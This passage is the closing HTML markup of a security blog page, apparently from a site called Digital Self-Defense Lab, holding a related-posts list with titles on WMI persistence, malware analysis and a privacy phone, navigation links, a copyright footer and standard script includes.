                <h3>Related posts</h3>
                <ul>
                  <li>
                    <a href="/2020/01/19/WMI-Persistence.html">
                      WMI Persistence (T1084)
                      <small><time class="text-primary" datetime="2020-01-19T11:00:00+01:00">19 Jan 2020</time></small>
                    </a>
                  </li>
                  <li>
                    <a href="/2019/11/30/Battlefield-Malware-Analysis.html">
                      Battlefield Malware Analysis (Part 1)
                      <small><time class="text-primary" datetime="2019-11-30T11:00:02+01:00">30 Nov 2019</time></small>
                    </a>
                  </li>
                  <li>
                    <a href="/2019/11/30/Do-It-Yourself-Privacy-Phone.html">
                      Do it yourself Privacy Phone
                      <small><time class="text-primary" datetime="2019-11-30T11:00:01+01:00">30 Nov 2019</time></small>
                    </a>
                  </li>
                </ul>
              </aside>
              <hr class="m-2">
              <div class="pagination-wrapper">
                <div class="pagination">
                  <a class="pagination-step" href="/">Back home</a>
                  <a class="pagination-step" href="/blog/">More posts</a>
                </div>
              </div>
            </footer>
          </article>
        </div>
      </section>
    </div>
    <div class="container-fluid p-0">
      <footer class="global-footer">
        <p class="m-0 text-center text-white">Copyright &copy; 2020, Digital Self-Defense Lab</p>
      </footer>
    </div>
    <script src="/assets/vendor/jquery/jquery.min.js"></script>
    <script src="/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="/assets/vendor/jquery-easing/jquery.easing.min.js"></script>
    <script src="/assets/js/main.min.js"></script>
  </body>
</html>